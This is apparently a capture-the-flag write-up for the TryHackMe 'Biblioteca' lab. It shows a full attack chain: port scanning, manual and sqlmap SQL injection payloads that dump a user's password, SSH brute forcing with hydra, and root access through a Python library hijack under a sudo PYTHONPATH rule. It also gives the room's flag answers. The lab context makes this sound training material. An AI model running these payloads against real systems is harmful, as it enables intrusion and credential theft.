---
Shhh. Be very very quiet, no shouting inside the biblioteca.
---

![](https://i.postimg.cc/0N8fPR3k/Webp-net-resizeimage.jpg)

###  What is the user and root flag?

 Start Machine

Hit 'em with the classics.  

Answer the questions below

```
┌──(kali㉿kali)-[~/nappy]
└─$ rustscan -a 10.10.232.50 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.232.50:22
Open 10.10.232.50:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 17:43 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:43
Completed Parallel DNS resolution of 1 host. at 17:43, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:43
Scanning 10.10.232.50 [2 ports]
Discovered open port 22/tcp on 10.10.232.50
Discovered open port 8000/tcp on 10.10.232.50
Completed Connect Scan at 17:43, 0.21s elapsed (2 total ports)
Initiating Service scan at 17:43
Scanning 2 services on 10.10.232.50
Completed Service scan at 17:43, 6.94s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.232.50.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 6.25s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.82s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Nmap scan report for 10.10.232.50
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-10 17:43:45 EST for 14s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 000bf9bf1d49a6c3fa9c5e08d16d8202 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjGXxdFr0mHKml76YqbA09iT/zirMlq63GKdZVLK3ey11u+RmZEpu+4kDoSpTomeHq5PzD2tOvC3xCmfe+r0yJuG+052rgshOHGP5Jsh49ZuOsCNBmf9d5nYQERArUohS+XWk5AzcOAvENMPrN52qZvnZAPBJUR2M3LUtxLeCXd/Pn47rnolC8kSoZnReUHuyDSK6V0KDsgz9gZfsZEasEVFWeQHSeX70stnpRIPEgB523+EjG9VbeBhSVXOaX99RvkwA2EKdX95fAllkmXIwfscKCDcvCKBx2b/64dA2E0tiXx6TTN1rpY47NB1LTHFyEzXhdY04xI4YWGR0OdlHiF22qTxZ40WNQSP1dfazgpEzXm6tpGD7dE9Ko+fgAy+6wCWOuw2rQVefv/hheU8idtl8S+A4LC9NupPmDFf28GVpMFkMry2/yjD7e8Z1Vl3ZBp/BO0IVUnm/fFrGBEJ2e0RJEzI0lWXbytFNZkCLAZt+8IQLsvPep80zxKM9Jlps=
|   256 a10c8e5df07fa532b2eb2f7abfedbf3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk6WcGKOLXNfFSm4hmo/IJAB/aFJ8ZihzQUm796VuMqs4aIusn5+Lu0C8pv8XB22fwBS8XuB6l9LjTo10CFmoQ=
|   256 9eefc90afce99eede32db130b65fd40b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsjiudT4XOiE2akDRkCkDkhVRMB7oIVMpgkeM63BmO
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds


http://10.10.232.50:8000/

login page

Hi smokey!!</br></br> Welcome to the index page...

sqli (' or 1=1-- j)

let's use sqlmap (easy way)

┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -u http://10.10.232.50:8000/ --forms --dump
        ___
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:49:16 /2023-01-10/

[17:49:16] [INFO] testing connection to the target URL
[17:49:16] [INFO] searching for forms
[1/1] Form:
POST http://10.10.232.50:8000/login
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[17:49:37] [INFO] using '/home/kali/.local/share/sqlmap/output/results-01102023_0549pm.csv' as the CSV results file in multiple targets mode
[17:49:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:49:37] [INFO] testing if the target URL content is stable
[17:49:37] [INFO] target URL content is stable
[17:49:37] [INFO] testing if POST parameter 'username' is dynamic
[17:49:38] [WARNING] POST parameter 'username' does not appear to be dynamic
[17:49:38] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[17:49:38] [INFO] testing for SQL injection on POST parameter 'username'
[17:49:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:49:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:49:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:49:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:49:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:49:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:49:46] [INFO] testing 'Generic inline queries'
[17:49:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:49:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:49:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:49:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:50:00] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:50:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:50:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:50:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:50:36] [INFO] target URL appears to have 4 columns in query
[17:50:37] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[17:50:55] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[17:50:56] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:50:56] [INFO] fetching current database
[17:50:56] [INFO] fetching tables for database: 'website'
[17:50:57] [INFO] fetching columns for table 'users' in database 'website'
[17:50:57] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+

[17:50:57] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.50/dump/website/users.csv'
[17:50:57] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 26 times
[17:50:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-01102023_0549pm.csv'                                                                                                                 

[*] ending @ 17:50:57 /2023-01-10/

now using burpsuite (save item to use with sqlmap later like sql.txt or another name)

send to repeater (response render to see output)

testing (first way)

username='+or+1=1-- -&password=witty (hi smokey)
username='+or+1=1#&password=witty (hi smokey)

SQL injection UNION attack, determining the number of columns returned by the query
username='+UNION+SELECT+NULL,NULL#&password=witty (internal error server so more colums)
username='+UNION+SELECT+NULL,NULL,NULL,NULL#&password=witty (Hi None! so there are 4 cols)

SQL injection UNION attack, finding a column containing text
username='+UNION+SELECT+NULL,'witty',NULL,NULL#&password=witty (Hi witty!)

SQL injection attack, querying the database type and version on MySQL and Microsoft
username='+UNION+SELECT+NULL,@@version,NULL,NULL#&password=witty (8.0.28 Ubuntu...)

username='+UNION+SELECT+NULL,database(),NULL,NULL#&password=witty
Hi website!!

username='+UNION+SELECT+NULL,table_name,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema='website'#&password=witty
Hi users!!

username='+UNION+SELECT+NULL,column_name,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'#&password=witty
Hi id!!

username='+UNION+SELECT+NULL,group_concat(column_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'#&password=witty
Hi id,username,password,email!!

username='+UNION+SELECT+NULL,group_concat(username),NULL,NULL+FROM+users#&password=witty
Hi smokey!!

username='+UNION+SELECT+NULL,group_concat(password),NULL,NULL+FROM+users+WHERE+username='smokey'#&password=witty
Hi My_P@ssW0rd123!!

or

username='+union+select+null,group_concat(username,':',password),null,null+from+users--+&password=witty
Hi smokey:My_P@ssW0rd123!!

second way (in less steps)

username='+union+select+1,2,3,4--+&password=witty
Hi 2!!

username='+union+select+1,(select+group_concat(schema_name,"\r\n")+from+information_schema.schemata),3,4--+&password=witty
Hi information_schema
,website


username='+union+select+1,(select+group_concat(table_name,":",column_name,"\r\n")+from+information_schema.columns+where+table_schema='website'),3,4--+&password=witty
Hi users:id
,users:username
,users:password
,users:email

username='+union+select+1,(select+group_concat(username,":",password,"\r\n")+from+website.users),3,4--+&password=witty
Hi smokey:My_P@ssW0rd123


now sqlmap (step by step)

┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -h                                         
        ___
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

┌──(kali㉿kali)-[~/nappy]
└─$ ls
admin.txt  blog.html  index.php  sql.txt
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy] (from burp)
└─$ cat sql.txt                      
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2022.8.2" exportTime="Tue Jan 10 17:56:32 EST 2023">
  <item>
    <time>Tue Jan 10 17:55:22 EST 2023</time>
    <url><![CDATA[http://10.10.232.50:8000/login]]></url>
    <host ip="10.10.232.50">10.10.232.50</host>
    <port>8000</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/login]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8xLjENCkhvc3Q6IDEwLjEwLjIzMi41MDo4MDAwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyOQ0KT3JpZ2luOiBodHRwOi8vMTAuMTAuMjMyLjUwOjgwMDANCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vMTAuMTAuMjMyLjUwOjgwMDAvbG9naW4NCkNvb2tpZTogc2Vzc2lvbj1leUpwWkNJNk1Td2liRzluWjJWa2FXNGlPblJ5ZFdVc0luVnpaWEp1WVcxbElqb2ljMjF2YTJWNUluMC5ZNzNxOXcuQUhZN09sT0NQSFVEN21XTVdhNnd0YUNfSjNBDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCnVzZXJuYW1lPXdpdHR5JnBhc3N3b3JkPXdpdHR5]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>

sqlmap is an open-source command-line tool that automates the process of detecting and exploiting SQL injection vulnerabilities. The `-r` option is used to specify a file containing a list of HTTP requests to be tested for SQL injection vulnerabilities. The requests in the file must be in the format of HTTP request strings, such as those that can be exported from a web browser's developer tools.

The -dbs option in `sqlmap` is used to enumerate the names of databases available on the target server after a successful SQL injection has been established. When this option is specified, `sqlmap` will attempt to retrieve a list of databases from the database management system (DBMS) and display them in the command-line interface. This can be useful for discovering the names of databases that contain sensitive information, which can then be targeted for further exploitation. It should be used after a successfull injection point identified.

┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -r sql.txt --dbs --batch
        ___
       __H__                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:03:43 /2023-01-10/

[20:03:43] [INFO] parsing HTTP request from 'sql.txt'
[20:03:45] [INFO] resuming back-end DBMS 'mysql' 
[20:03:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
---
[20:03:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[20:03:45] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] website

[20:03:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'

[*] ending @ 20:03:46 /2023-01-10/

┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -r sql.txt -D website --tables --batch
        ___
       __H__                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [(]     | .'| . |                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:39:40 /2023-01-10/

[20:39:40] [INFO] parsing HTTP request from 'sql.txt'
[20:39:41] [INFO] resuming back-end DBMS 'mysql' 
[20:39:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
---
[20:39:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[20:39:42] [INFO] fetching tables for database: 'website'
Database: website
[1 table]
+-------+
| users |
+-------+

[20:39:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'

[*] ending @ 20:39:42 /2023-01-10/

┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -r sql.txt -D website -T users --dump --batch
        ___
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . ["]     | .'| . |                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:40:36 /2023-01-10/

[20:40:36] [INFO] parsing HTTP request from 'sql.txt'
[20:40:36] [INFO] resuming back-end DBMS 'mysql' 
[20:40:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
---
[20:40:37] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[20:40:37] [INFO] fetching columns for table 'users' in database 'website'
[20:40:37] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+

[20:40:37] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.50/dump/website/users.csv'
[20:40:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.50'

[*] ending @ 20:40:37 /2023-01-10/

┌──(kali㉿kali)-[~/nappy]
└─$ ssh smokey@10.10.232.50                             
The authenticity of host '10.10.232.50 (10.10.232.50)' can't be established.
ED25519 key fingerprint is SHA256:xpqbWswo65YJezxXRx18Va9jub3YGOEzi9N17Mhy9FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.232.50' (ED25519) to the list of known hosts.
smokey@10.10.232.50's password: My_P@ssW0rd123
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 Jan 2023 01:41:26 AM UTC

  System load:  0.0               Processes:             113
  Usage of /:   58.3% of 9.78GB   Users logged in:       0
  Memory usage: 62%               IPv4 address for eth0: 10.10.232.50
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  7 03:21:42 2021 from 10.0.2.15
smokey@biblioteca:~$ id
uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
smokey@biblioteca:~$ groups
smokey
smokey@biblioteca:/home/hazel$ su hazel
Password: 
su: Authentication failure

┌──(kali㉿kali)-[~/nappy]
└─$ hydra -l hazel -P /usr/share/wordlists/rockyou.txt 10.10.232.50 ssh -V -t 64
[22][ssh] host: 10.10.232.50   login: hazel   password: hazel
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 20 final worker threads did not complete until end.
[ERROR] 20 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-10 20:58:33

hazel:hazel (sometimes username is the pass)

smokey@biblioteca:/home/hazel$ su hazel
Password: 
hazel@biblioteca:~$ cat user.txt 
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}

hazel@biblioteca:~$ cat hasher.py 
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()

hazel@biblioteca:~$ python3 hasher.py 
Enter a password to hash: hazel
Your MD5 hash is: 16b9652df79d0e4784bdbf478c9f4fee
Your SHA256 hash is: 9d053755e078005ef63af6258f5a743994a11d17daca304d49dec6c3ded3fba8
Your SHA1 hash is: f29ae37cab5058050a41b21befb382f26a5688c4

https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/

hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

hazel@biblioteca:/tmp$ cat hashlib.py 
import os
os.system("/bin/bash -p")
hazel@biblioteca:/tmp$ chmod +x hashlib.py
hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
root@biblioteca:/tmp# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}



```


![[Pasted image 20230110175516.png]]

![[Pasted image 20230110175810.png]]

What is the user flag?  

Weak password

*THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}*

What is the root flag?

*THM{PytH0n_LiBr@RY_H1j@acKIn6}*

[[Napping]]